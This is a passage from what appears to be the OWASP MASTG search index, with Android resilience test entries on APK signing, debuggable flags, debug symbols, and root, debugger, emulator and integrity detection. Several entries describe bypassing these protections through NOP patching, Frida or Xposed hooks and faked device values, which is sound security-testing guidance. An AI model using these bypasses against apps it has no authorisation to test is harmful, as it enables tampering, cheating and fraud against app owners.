1fc4de52d0daa33a9c0e3d67217a77c895b46266ef020fad0d48216a6ad6cb70\nSigner #1 certificate SHA-1 digest: 1df329fda8317da4f17f99be83aa64da62af406b\nSigner #1 certificate MD5 digest: 3dbdca9c1b56f6c85415b67957d15310\nSigner #1 key algorithm: RSA\nSigner #1 key size (bits): 2048\nSigner #1 public key SHA-256 digest: 296b4e40a31de2dcfa2ed277ccf787db0a524db6fc5eacdcda5e50447b3b1a26\nSigner #1 public key SHA-1 digest: 3e02ebf64f1bd4ca85732186b3774e9ccd60cb86\nSigner #1 public key MD5 digest: 24afa3496f98c66343fc9c8a0a7ff5a2\n</code></pre> <p>The signing configuration can be managed through Android Studio or the <code>signingConfigs</code> section in <code>build.gradle</code> or <code>build.gradle.kts</code>. To activate both the v3 and v4 schemes, the following values must be set:</p> <pre><code>// build.gradle\nandroid {\n  ...\n  signingConfigs {\n    config {\n        ...\n        enableV3Signing true\n        enableV4Signing true\n    }\n  }\n}\n</code></pre> <p>Note that APK v4 signing is optional and the lack of it does not represent a vulnerability. It is meant to allow developers to quickly deploy large APKs using the ADB Incremental APK installation in Android 11 and above.</p>","tags":["android","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0038/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Static analysis should be used to verify the APK signature.</p>","tags":["android","R","test","MSTG-CODE-1","masvs-resilience-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0039/","title":"MASTG-TEST-0039: Testing whether the App is Debuggable","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Debuggable Flag Enabled in the AndroidManifest</li> <li> Debugging Enabled for WebViews</li> </ul>","tags":["android","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0039/#overview","title":"Overview","text":"","tags":["android","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0039/#static-analysis","title":"Static Analysis","text":"<p>Check <code>AndroidManifest.xml</code> to determine whether the <code>android:debuggable</code> attribute has been set and to find the attribute's value:</p> <pre><code>    ...\n    &lt;application android:allowBackup=\"true\" android:debuggable=\"true\" android:icon=\"@drawable/ic_launcher\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme\"&gt;\n    ...\n</code></pre> <p>You can use <code>aapt</code> tool from the Android SDK with the following command line to quickly check if the <code>android:debuggable=\"true\"</code> directive is present:</p> <pre><code># If the command print 1 then the directive is present\n# The regex search for this line: android:debuggable(0x0101000f)=(type 0x12)0xffffffff\n$ aapt d xmltree sieve.apk AndroidManifest.xml | grep -Ec \"android:debuggable\\(0x[0-9a-f]+\\)=\\(type\\s0x[0-9a-f]+\\)0xffffffff\"\n1\n</code></pre> <p>For a release build, this attribute should always be set to <code>\"false\"</code> (the default value).</p>","tags":["android","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0039/#dynamic-analysis","title":"Dynamic Analysis","text":"<p><code>adb</code> can be used to determine whether an application is debuggable.</p> <p>Use the following command:</p> <pre><code># If the command print a number superior to zero then the application have the debug flag\n# The regex search for these lines:\n# flags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]\n# pkgFlags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA ALLOW_BACKUP ]\n$ adb shell dumpsys package com.mwr.example.sieve | grep -c \"DEBUGGABLE\"\n2\n$ adb shell dumpsys package com.nondebuggableapp | grep -c \"DEBUGGABLE\"\n0\n</code></pre> <p>If an application is debuggable, executing application commands is trivial. In the <code>adb</code> shell, execute <code>run-as</code> by appending the package name and application command to the binary name:</p> <pre><code>$ run-as com.vulnerable.app id\nuid=10084(u0_a84) gid=10084(u0_a84) groups=10083(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_app:s0:c512,c768\n</code></pre> <p>Android Studio can also be used to debug an application and verify debugging activation for an app.</p> <p>Another method for determining whether an application is debuggable is attaching <code>jdb</code> to the running process. If this is successful, debugging will be activated.</p> <p>The following procedure can be used to start a debug session with <code>jdb</code>:</p> <ol> <li> <p>Using <code>adb</code> and <code>jdwp</code>, identify the PID of the active application that you want to debug:</p> <pre><code>$ adb jdwp\n2355\n16346  &lt;== last launched, corresponds to our application\n</code></pre> </li> <li> <p>Create a communication channel by using <code>adb</code> between the application process (with the PID) and your host computer by using a specific local port:</p> <pre><code># adb forward tcp:[LOCAL_PORT] jdwp:[APPLICATION_PID]\n$ adb forward tcp:55555 jdwp:16346\n</code></pre> </li> <li> <p>Using <code>jdb</code>, attach the debugger to the local communication channel port and start a debug session:</p> <pre><code>$ jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n&gt; help\n</code></pre> </li> </ol> <p>A few notes about debugging:</p> <ul> <li> jadx can be used to identify interesting locations for breakpoint insertion.</li> <li>Usage of basic commands for jdb can be found at Tutorialspoint.</li> <li>If you get an error telling that \"the connection to the debugger has been closed\" while <code>jdb</code> is being bound to the local communication channel port, kill all adb sessions and start a single new session.</li> </ul>","tags":["android","R","test","MSTG-CODE-2","masvs-resilience-4","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0040/","title":"MASTG-TEST-0040: Testing for Debugging Symbols","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0040: Testing for Debugging Symbols (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-CODE-3","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0040/#overview","title":"Overview","text":"","tags":["android","R","test","MSTG-CODE-3","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0040/#static-analysis","title":"Static Analysis","text":"<p>Symbols are usually stripped during the build process, so you need the compiled bytecode and libraries to make sure that unnecessary metadata has been discarded.</p> <p>First, find the <code>nm</code> binary in your Android NDK and export it (or create an alias).</p> <pre><code>export NM = $ANDROID_NDK_DIR/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm\n</code></pre> <p>To display debug symbols:</p> <pre><code>$NM -a libfoo.so\n/tmp/toolchains/arm-linux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm: libfoo.so: no symbols\n</code></pre> <p>To display dynamic symbols:</p> <pre><code>$NM -D libfoo.so\n</code></pre> <p>Alternatively, open the file in your favorite disassembler and check the symbol tables manually.</p> <p>Dynamic symbols can be stripped via the <code>visibility</code> compiler flag. Adding this flag causes gcc to discard the function names while preserving the names of functions declared as <code>JNIEXPORT</code>.</p> <p>Make sure that the following has been added to build.gradle:</p> <pre><code>externalNativeBuild {\n    cmake {\n        cppFlags \"-fvisibility=hidden\"\n    }\n}\n</code></pre>","tags":["android","R","test","MSTG-CODE-3","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0040/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Static analysis should be used to verify debugging symbols.</p>","tags":["android","R","test","MSTG-CODE-3","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0041/","title":"MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Logging of StrictMode Violations</li> </ul>","tags":["android","R","test","MSTG-CODE-4","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0041/#overview","title":"Overview","text":"","tags":["android","R","test","MSTG-CODE-4","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0041/#static-analysis","title":"Static Analysis","text":"<p>To determine whether <code>StrictMode</code> is enabled, you can look for the <code>StrictMode.setThreadPolicy</code> or <code>StrictMode.setVmPolicy</code> methods. Most likely, they will be in the <code>onCreate</code> method.</p> <p>The detection methods for the thread policy are:</p> <ul> <li><code>detectDiskWrites()</code></li> <li><code>detectDiskReads()</code></li> <li><code>detectNetwork()</code></li> </ul> <p>The penalties for thread policy violation are:</p> <ul> <li><code>penaltyLog()</code>: Logs a message to LogCat.</li> <li><code>penaltyDeath()</code>: Crashes application, runs at the end of all enabled penalties.</li> <li><code>penaltyDialog()</code>: Shows a dialog.</li> </ul> <p>Have a look at the best practices for using StrictMode.</p>","tags":["android","R","test","MSTG-CODE-4","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0041/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>There are several ways of detecting <code>StrictMode</code>; the best choice depends on how the policies' roles are implemented. They include</p> <ul> <li>Logcat,</li> <li>a warning dialog,</li> <li>application crash.</li> </ul>","tags":["android","R","test","MSTG-CODE-4","masvs-resilience-3","deprecated"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0045/","title":"MASTG-TEST-0045: Testing Root Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0045: Testing Root Detection (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-1","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0045/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<p>Run execution traces with jdb, DDMS, <code>strace</code>, and/or kernel modules to find out what the app is doing. You'll usually see all kinds of suspect interactions with the operating system, such as opening <code>su</code> for reading and obtaining a list of processes. These interactions are surefire signs of root detection. Identify and deactivate the root detection mechanisms, one at a time. If you're performing a black box resilience assessment, disabling the root detection mechanisms is your first step.</p> <p>To bypass these checks, you can use several techniques, most of which were introduced in the \"Reverse Engineering and Tampering\" chapter:</p> <ul> <li>Renaming binaries. For example, in some cases simply renaming the <code>su</code> binary is enough to defeat root detection (try not to break your environment though!).</li> <li>Unmounting <code>/proc</code> to prevent reading of process lists. Sometimes, the unavailability of <code>/proc</code> is enough to bypass such checks.</li> <li>Using Frida or Xposed to hook APIs on the Java and native layers. This hides files and processes, hides the contents of files, and returns all kinds of bogus values that the app requests.</li> <li>Hooking low-level APIs by using kernel modules.</li> <li>Patching the app to remove the checks.</li> </ul>","tags":["android","R","test","MSTG-RESILIENCE-1","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0045/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Check for root detection mechanisms, including the following criteria:</p> <ul> <li>Multiple detection methods are scattered throughout the app (as opposed to putting everything into a single method).</li> <li>The root detection mechanisms operate on multiple API layers (Java APIs, native library functions, assembler/system calls).</li> <li>The mechanisms are somehow original (they're not copied and pasted from StackOverflow or other sources).</li> </ul> <p>Develop bypass methods for the root detection mechanisms and answer the following questions:</p> <ul> <li>Can the mechanisms be easily bypassed with standard tools, such as  Choicy?</li> <li>Is static/dynamic analysis necessary to handle the root detection?</li> <li>Do you need to write custom code?</li> <li>How long did successfully bypassing the mechanisms take?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul> <p>If root detection is missing or too easily bypassed, make suggestions in line with the effectiveness criteria listed above. These suggestions may include more detection mechanisms and better integration of existing mechanisms with other defenses.</p>","tags":["android","R","test","MSTG-RESILIENCE-1","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0046/","title":"MASTG-TEST-0046: Testing Anti-Debugging Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0046: Testing Anti-Debugging Detection (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0046/#bypassing-debugger-detection","title":"Bypassing Debugger Detection","text":"<p>There's no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you've already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable. The following methods describe different approaches to bypass debugger detection:</p> <ul> <li>Patching the anti-debugging functionality: Disable the unwanted behavior by simply overwriting it with NOP instructions. Note that more complex patches may be required if the anti-debugging mechanism is well designed.</li> <li>Using Frida or Xposed to hook APIs on the Java and native layers: manipulate the return values of functions such as <code>isDebuggable</code> and <code>isDebuggerConnected</code> to hide the debugger.</li> <li>Changing the environment: Android is an open environment. If nothing else works, you can modify the operating system to subvert the assumptions the developers made when designing the anti-debugging tricks.</li> </ul>","tags":["android","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0046/#bypassing-example-uncrackable-app-for-android-level-2","title":"Bypassing Example: UnCrackable App for Android Level 2","text":"<p>When dealing with obfuscated apps, you'll often find that developers purposely \"hide away\" data and functionality in native libraries. You'll find an example of this in  Android UnCrackable L2.</p> <p>At first glance, the code looks like the prior challenge. A class called <code>CodeCheck</code> is responsible for verifying the code entered by the user. The actual check appears to occur in the <code>bar</code> method, which is declared as a native method.</p> <pre><code>package sg.vantagepoint.uncrackable2;\n\npublic class CodeCheck {\n    public CodeCheck() {\n        super();\n    }\n\n    public boolean a(String arg2) {\n        return this.bar(arg2.getBytes());\n    }\n\n    private native boolean bar(byte[] arg1) {\n    }\n}\n\n    static {\n        System.loadLibrary(\"foo\");\n    }\n</code></pre> <p>Please see different proposed solutions for the Android Crackme Level 2 in GitHub.</p>","tags":["android","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0046/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Check for anti-debugging mechanisms, including the following criteria:</p> <ul> <li>Attaching jdb and ptrace-based debuggers fails or causes the app to terminate or malfunction.</li> <li>Multiple detection methods are scattered throughout the app's source code (as opposed to their all being in a single method or function).</li> <li>The anti-debugging defenses operate on multiple API layers (Java, native library functions, assembler/system calls).</li> <li>The mechanisms are somehow original (as opposed to being copied and pasted from StackOverflow or other sources).</li> </ul> <p>Work on bypassing the anti-debugging defenses and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the anti-debugging code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your subjective assessment of the difficulty of bypassing the mechanisms?</li> </ul> <p>If anti-debugging mechanisms are missing or too easily bypassed, make suggestions in line with the effectiveness criteria above. These suggestions may include adding more detection mechanisms and better integration of existing mechanisms with other defenses.</p>","tags":["android","R","test","MSTG-RESILIENCE-2","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/","title":"MASTG-TEST-0047: Testing File Integrity Checks","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0047: Testing File Integrity Checks (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-3","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/#bypassing-file-integrity-checks","title":"Bypassing File Integrity Checks","text":"","tags":["android","R","test","MSTG-RESILIENCE-3","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/#bypassing-the-application-source-integrity-checks","title":"Bypassing the application-source integrity checks","text":"<ol> <li>Patch the anti-debugging functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li> <li>Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file instead of the modified file.</li> <li>Use the kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.</li> </ol> <p>Refer to Method Hooking for examples of patching, code injection, and kernel modules.</p>","tags":["android","R","test","MSTG-RESILIENCE-3","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/#bypassing-the-storage-integrity-checks","title":"Bypassing the storage integrity checks","text":"<ol> <li>Retrieve the data from the device.</li> <li>Alter the retrieved data and then put it back into storage.</li> </ol>","tags":["android","R","test","MSTG-RESILIENCE-3","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0047/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Application-source integrity checks:</p> <p>Run the app in an unmodified state and make sure that everything works. Apply simple patches to <code>classes.dex</code> and any .so libraries in the app package. Re-package and re-sign the app as described in the \"Basic Security Testing\" chapter, then run the app. The app should detect the modification and respond in some way. At the very least, the app should alert the user and/or terminate. Work on bypassing the defenses and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the anti-debugging code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul> <p>Storage integrity checks:</p> <p>An approach similar to that for application-source integrity checks applies. Answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value)?</li> <li>How difficult is getting the HMAC key or the asymmetric private key?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["android","R","test","MSTG-RESILIENCE-3","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0048/","title":"MASTG-TEST-0048: Testing Reverse Engineering Tools Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0048: Testing Reverse Engineering Tools Detection (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-4","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0048/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Launch the app with various reverse engineering tools and frameworks installed in your test device. Include at least the following:  Frida,  Xposed.</p> <p>The app should respond in some way to the presence of those tools. For example by:</p> <ul> <li>Alerting the user and asking for accepting liability.</li> <li>Preventing execution by gracefully terminating.</li> <li>Securely wiping any sensitive data stored on the device.</li> <li>Reporting to a backend server, e.g, for fraud detection.</li> </ul> <p>Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:</p> <ul> <li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>How difficult is identifying the anti reverse engineering code via static and dynamic analysis?</li> <li>Did you need to write custom code to disable the defenses? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul> <p>The following steps should guide you when bypassing detection of reverse engineering tools:</p> <ol> <li>Patch the anti reverse engineering functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li> <li>Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file, not the modified file.</li> <li>Use a kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.</li> </ol>","tags":["android","R","test","MSTG-RESILIENCE-4","masvs-resilience-4"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0049/","title":"MASTG-TEST-0049: Testing Emulator Detection","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0049: Testing Emulator Detection (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-5","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0049/#bypassing-emulator-detection","title":"Bypassing Emulator Detection","text":"<ol> <li>Patch the emulator detection functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li> <li>Use Frida or Xposed APIs to hook file system APIs on the Java and native layers. Return innocent-looking values (preferably taken from a real device) instead of the telltale emulator values. For example, you can override the <code>TelephonyManager.getDeviceID</code> method to return an IMEI value.</li> </ol>","tags":["android","R","test","MSTG-RESILIENCE-5","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0049/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Install and run the app in the emulator. The app should detect that it is being executed in an emulator and terminate or refuse to execute the functionality that's meant to be protected.</p> <p>Work on bypassing the defenses and answer the following questions:</p> <ul> <li>How difficult is identifying the emulator detection code via static and dynamic analysis?</li> <li>Can the detection mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li> <li>Did you need to write custom code to disable the anti-emulation feature(s)? How much time did you need?</li> <li>What is your assessment of the difficulty of bypassing the mechanisms?</li> </ul>","tags":["android","R","test","MSTG-RESILIENCE-5","masvs-resilience-1"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0050/","title":"MASTG-TEST-0050: Testing Runtime Integrity Checks","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0050: Testing Runtime Integrity Checks (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-6","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0050/#effectiveness-assessment","title":"Effectiveness Assessment","text":"<p>Make sure that all file-based detection of reverse engineering tools is disabled. Then, inject code by using Xposed, Frida, and Substrate, and attempt to install native hooks and Java method hooks. The app should detect the \"hostile\" code in its memory and respond accordingly.</p> <p>Work on bypassing the checks with the following techniques:</p> <ol> <li>Patch the integrity checks. Disable the unwanted behavior by overwriting the respective bytecode or native code with NOP instructions.</li> <li>Use Frida or Xposed to hook the APIs used for detection and return fake values.</li> </ol>","tags":["android","R","test","MSTG-RESILIENCE-6","masvs-resilience-2"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0051/","title":"MASTG-TEST-0051: Testing Obfuscation","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0051: Testing Obfuscation (android)</p> <p> Send Feedback</p>","tags":["android","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0051/#overview","title":"Overview","text":"","tags":["android","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0051/#static-analysis","title":"Static Analysis","text":"<p>Decompile the APK ( Decompiling Java Code) and review it ( Reviewing Decompiled Java Code) to determine whether the codebase has been obfuscated.</p> <p>Below you can find a sample for an obfuscated code block:</p> <pre><code>package com.a.a.a;\n\nimport com.a.a.b.a;\nimport java.util.List;\n\nclass a$b\n  extends a\n{\n  public a$b(List paramList)\n  {\n    super(paramList);\n  }\n\n  public boolean areAllItemsEnabled()\n  {\n    return true;\n  }\n\n  public boolean isEnabled(int paramInt)\n  {\n    return true;\n  }\n}\n</code></pre> <p>Here are some considerations:</p> <ul> <li>Meaningful identifiers, such as class names, method names, and variable names, might have been discarded.</li> <li>String resources and strings in binaries might have been encrypted.</li> <li>Code and data related to the protected functionality might be encrypted, packed, or otherwise concealed.</li> </ul> <p>For native code:</p> <ul> <li>libc APIs (e.g open, read) might have been replaced with OS syscalls.</li> <li>Obfuscator-LLVM might have been applied to perform \"Control Flow Flattening\" or \"Bogus Control Flow\".</li> </ul> <p>Some of these techniques are discussed and analyzed in the blog post \"Security hardening of Android native code\" by Gautam Arvind and in the \"APKiD: Fast Identification of AppShielding Products\" presentation by Eduardo Novella.</p> <p>For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used. Tools such as  APKiD may give you additional indications about which techniques were used for the target app such as obfuscators, packers and anti-debug measures.</p>","tags":["android","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0051/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can use  APKiD to detect if the app has been obfuscated.</p> <p>Example using the  Android UnCrackable L4:</p> <pre><code>apkid mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk\n[+] APKiD 2.1.2 :: from RedNaga :: rednaga.io\n[*] mastg/Crackmes/Android/Level_04/r2pay-v1.0.apk!classes.dex\n |-&gt; anti_vm : Build.TAGS check, possible ro.secure check\n |-&gt; compiler : r8\n |-&gt; obfuscator : unreadable field names, unreadable method names\n</code></pre> <p>In this case it detects that the app has unreadable field names and method names, among other things.</p>","tags":["android","R","test","MSTG-RESILIENCE-9","masvs-resilience-3"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/","title":"MASTG-TEST-0224: Usage of Insecure Signature Version","text":"","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/#overview","title":"Overview","text":"<p>Not using newer APK signing schemes means that the app lacks the enhanced security provided by more robust, updated mechanisms.</p> <p>This test checks if the outdated v1 signature scheme is enabled. The v1 scheme is vulnerable to certain attacks, such as the \"Janus\" vulnerability (CVE-2017-13156), because it does not cover all parts of the APK file, allowing malicious actors to potentially modify parts of the APK without invalidating the signature. Relying solely on v1 signing therefore increases the risk of tampering and compromises app security.</p> <p>To learn more about APK Signing Schemes, see \"Signing Process\".</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/#steps","title":"Steps","text":"<ol> <li>Obtain the <code>minSdkVersion</code> attribute from the AndroidManifest.xml, e.g., via  Obtaining Information from the AndroidManifest.</li> <li>List all used signature schemes as shown in  Obtaining Information about the APK Signature.</li> </ol>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/#observation","title":"Observation","text":"<p>The output should contain the value of the <code>minSdkVersion</code> attribute and the used signature schemes (for example <code>Verified using v3 scheme (APK Signature Scheme v3): true</code>).</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/#evaluation","title":"Evaluation","text":"<p>The test case fails if the app has a <code>minSdkVersion</code> attribute of 24 and above, and only the v1 signature scheme is enabled.</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0224/#mitigations","title":"Mitigations","text":"<ul> <li> Use Up-to-Date APK Signing Schemes</li> </ul>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0225/","title":"MASTG-TEST-0225: Usage of Insecure Signature Key Size","text":"","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0225/#overview","title":"Overview","text":"<p>For Android apps, the cryptographic strength of the APK signature is essential for maintaining the app's integrity and authenticity. Using a signature key with insufficient length, such as an RSA key shorter than 2048 bits, weakens security, making it easier for attackers to compromise the signature. This vulnerability could allow malicious actors to forge signatures, tamper with the app's code, or distribute unauthorized, modified versions.</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0225/#steps","title":"Steps","text":"<ol> <li>List the additional signature information using  Obtaining Information about the APK Signature.</li> </ol>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0225/#observation","title":"Observation","text":"<p>The output should contain the information about the key size in a line like: <code>Signer #1 key size (bits):</code>.</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0225/#evaluation","title":"Evaluation","text":"<p>The test case fails if any of the key sizes (in bits) is less than 2048 (RSA). For example, <code>Signer #1 key size (bits): 1024</code>.</p>","tags":["android","R","test","MASWE-0104"]},{"location":"MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0226/","title":"MASTG-TEST-0226: Debuggable Flag Enabled in the 